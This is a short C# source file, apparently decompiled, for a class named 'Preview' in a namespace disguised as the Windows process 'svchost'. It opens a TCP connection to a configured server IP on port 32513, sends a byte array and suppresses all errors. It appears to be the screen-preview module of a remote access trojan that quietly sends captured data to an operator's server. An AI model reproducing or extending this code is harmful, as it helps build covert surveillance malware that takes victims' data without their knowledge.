using System;
using System.Net.Sockets;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic.CompilerServices;

namespace svchost;

public class Preview
{
	public static byte[] abyte;

	private TcpClient PreviewClient;

	private NetworkStream PreviewStream;

	public Preview()
	{
		PreviewClient = new TcpClient();
	}

	public void SendPreview()
	{
		Thread.Sleep(1000);
		Application.DoEvents();
		try
		{
			PreviewClient.Connect(Form1.ServerIP, 32513);
			PreviewClient.NoDelay = true;
			PreviewStream = PreviewClient.GetStream();
			PreviewStream.Write(abyte, 0, abyte.Length);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		PreviewClient.Close();
		PreviewStream.Close();
	}
}
